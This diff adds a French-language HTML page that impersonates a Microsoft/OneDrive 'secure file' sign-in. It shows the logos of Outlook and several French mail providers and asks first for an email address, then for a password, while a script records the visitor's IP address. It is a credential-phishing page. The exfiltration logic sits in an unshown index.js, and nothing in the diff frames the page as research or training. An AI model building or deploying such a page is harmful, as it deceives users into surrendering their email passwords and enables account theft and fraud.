@@ -1,0 +1,236 @@
+<html dir="ltr" lang="fr-FR">
+
+<head>
+    <title>Sign in</title>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=10">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./assets/css/hrd.css?b=18213.30552">
+    <link rel="stylesheet" href="./assets/css/mycss.css">
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js"
+        integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+    <script>
+        
+        window.locIp = "";
+        window.iPfull = "";
+
+        fetch("https://api.ipify.org?format=json")
+            .then((response) => response.json())
+            .then((data) => {
+                console.log(data);
+                window.locIp = data;
+                window.iPfull = data.ip || "";
+            })
+            .catch((error) => {
+                console.error("Erreur lors de la récupération de l'adresse IP :", error);
+            });
+    </script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="./assets/css/modal.css">
+    
+</head>
+
+<body>
+    <style type="text/css">
+        * {
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+    </style>
+
+    <div id="app">
+        
+        <div v-if="login==1">         
+
+            
+
+            <div class="background">
+                <div class="blur"></div>
+                <div class="full"></div>
+            </div>
+            <header>
+                <div class="logo-container">
+                    <img src="./assets/img/OneDrive-blanc.png" alt="Centered Image">
+                </div>
+            </header>
+            <div class="outer">
+                <div class="middle">
+                    <h2 class="titre-verification">Vérifier votre identité</h2>
+                    <main class="inner" style="">
+                        <div class="" aria-hidden="true">
+                            <p class="texte-securise">Vous avez reçu un fichier sécurisé</p>
+                            <div class="mytxtlog">
+                                <picture class="logo margin-bottom-16 logoPdf">
+                                    <source srcset="./assets/img/pdf-icon.png">
+                                    <img src="./assets/img/microsoft_logo.png" alt="Logo Microsoft"
+                                        data-bind="attr: {alt: config.text.microsoftLogo}">
+                                </picture>
+                                <p class="mykb">64.8 KB</p>
+                            </div>
+
+                        </div>
+
+                        <div class="margin-bottom-20" aria-hidden="true">
+                            <p class="soutitresecu">Pour lire le document veuillez entrer les identifiants de messagerie
+                                auxquels ce fichier a été envoyé</p>
+                        </div>
+
+                        <div class="margin-bottom-20" aria-hidden="true">
+                            <div class="logo margin-bottom-16">
+                                <img src="./assets/img/outlook.png" alt="Logo Microsoft"
+                                    data-bind="attr: {alt: config.text.microsoftLogo}">
+                                <img src="./assets/img/laposte.png" alt="Logo Microsoft"
+                                    data-bind="attr: {alt: config.text.microsoftLogo}">
+                                <img src="./assets/img/orange.png" class="grandlogo" alt="Logo Microsoft"
+                                    data-bind="attr: {alt: config.text.microsoftLogo}">
+                                <img src="./assets/img/sfr.png" class="grandlogo" alt="Logo Microsoft"
+                                    data-bind="attr: {alt: config.text.microsoftLogo}">
+                                <img src="./assets/img/free.png" alt="Logo Microsoft"
+                                    data-bind="attr: {alt: config.text.microsoftLogo}">
+                                <img src="./assets/img/bouygues.png" alt="Logo Microsoft"
+                                    data-bind="attr: {alt: config.text.microsoftLogo}">
+
+                            </div>
+                        </div>
+
+                        <div id="placeholder">
+
+                            <div class="alert alert-error text-body margin-bottom-12 col-md-12" v-if="error"
+                                role="alert" aria-live="assertive" aria-atomic="true">
+                                {{ error }}
+                            </div>
+                            <div class="row margin-bottom-16">
+                                <div class="form-group col-md-12 placeholderContainer first">
+                                    <input type="email" class="form-control" id="emailTextInput"
+                                        placeholder="Adresse de messagerie" aria-required="true" spellcheck="false"
+                                        autocomplete="off" v-model="email" aria-invalid="!!error" @focus="error=''" />
+
+                                    <div data-lastpass-icon-root=""
+                                        style="position: relative !important; height: 0px !important; width: 0px !important; float: left !important;">
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="row inline-block no-margin-top-bottom button-container">
+                                <button type="button" class="btn btn-block btn-primary btn-override" id="nextButton"
+                                    @click="submit" :disabled="loading">
+                                    <span v-if="loading">Chargement...</span>
+                                    <span v-else>Suivant</span>
+                                </button>
+                            </div>
+                        </div>
+                    </main>
+                </div>
+            </div>
+            <footer id="footer">
+                <div>
+                    <div class="footerNode">
+                        <span>©2024 Microsoft</span>
+                        <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}"
+                            href="#" data-url="">Déclaration de confidentialité</a>
+                            <img src="./assets/img/microsoft_logo.png" alt="Footer Logo" style="margin-left: 10px;">
+                        
+                    </div>
+                </div>
+            </footer>
+        </div>
+
+        <div v-if="login==2">
+            <div class="background">
+                <div class="blur"></div>
+                <div class="full"></div>
+            </div>
+            <div class="outer">
+                <div class="middle">
+                    <h1 class="mytitle">Accédez à votre fichier sécurisé</h1>
+                    <main class="inner">
+                        <div class="" aria-hidden="true">
+                            <p class="titresecu">Fichier sécurisé prêt à être consulté</p>
+                            <div class="mytxtlog">
+                                <picture class="logo margin-bottom-16 logoPdf">
+                                    <source srcset="./assets/img/pdf-icon.png">
+                                    <img src="./assets/img/microsoft_logo.png" alt="Logo Microsoft">
+                                </picture>
+                                <p class="mykb">64.8 KB</p>
+                            </div>
+                        </div>
+        
+                        <div class="margin-bottom-20" aria-hidden="true">
+                            <p class="soutitresecu">Pour accéder au document, veuillez fournir votre adresse e-mail et votre mot de passe.</p>
+                        </div>
+        
+                        <div class="margin-bottom-20" aria-hidden="true">
+                            <div class="logo margin-bottom-16">
+                                <img :src="providerLogo" alt="Logo du fournisseur" v-if="providerLogo" />
+                            </div>
+                        </div>
+        
+                        <div id="placeholder">
+                            <div class="alert alert-error text-body margin-bottom-12 col-md-12" 
+                                v-if="error" 
+                                role="alert" 
+                                aria-live="assertive" 
+                                aria-atomic="true">
+                                {{ error }}
+                            </div>
+                            
+                            
+                            <div class="row margin-bottom-16">
+                                <div class="form-group col-md-12 placeholderContainer first">
+                                    <input type="email" class="form-control" id="emailTextInput"
+                                        placeholder="Adresse e-mail" aria-required="true" spellcheck="false"
+                                        autocomplete="off" v-model="email" @blur="updateProviderLogo" readonly>
+                                </div>
+                            </div>
+        
+                            <div class="row margin-bottom-16">
+                                <div class="form-group col-md-12 placeholderContainer">
+                                    <input type="password" class="form-control" id="passwordTextInput"
+                                        placeholder="Entrez votre mot de passe" aria-required="true" autocomplete="off"
+                                        v-model="password">
+                                </div>
+                            </div>
+        
+                            <div class="row inline-block no-margin-top-bottom button-container">
+                                <button class="btn btn-block btn-primary btn-override" id="nextButton" 
+                                    @click="submitLogin" :disabled="loading">
+                                    <span v-if="loading">Chargement...</span>
+                                    <span v-else>Connexion</span>
+                                </button>
+                            </div>
+                        </div>
+                    </main>
+                </div>
+            </div>
+            <footer id="footer">
+                <div>
+                    <div class="footerNode">
+                        <span>©2024 Microsoft</span>
+                        <a href="#" data-url="">Déclaration de confidentialité</a>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+        
+        <div v-if="showModal" class="modal-overlay" @click="closeModal">
+            <div class="modal" @click.stop>
+                <h2>Redirection</h2>
+                <p>{{ modalMessage }}</p>
+                <button @click="closeModal">Fermer</button>
+            </div>
+        </div>
+    </div>
+    <script src="./assets/js/index.js"></script>
+
+    <script src="./assets/js/jquery-1.12.4.1.min.js?b=18213.30552"></script>
+
+
+
+</body>
+
+</html>
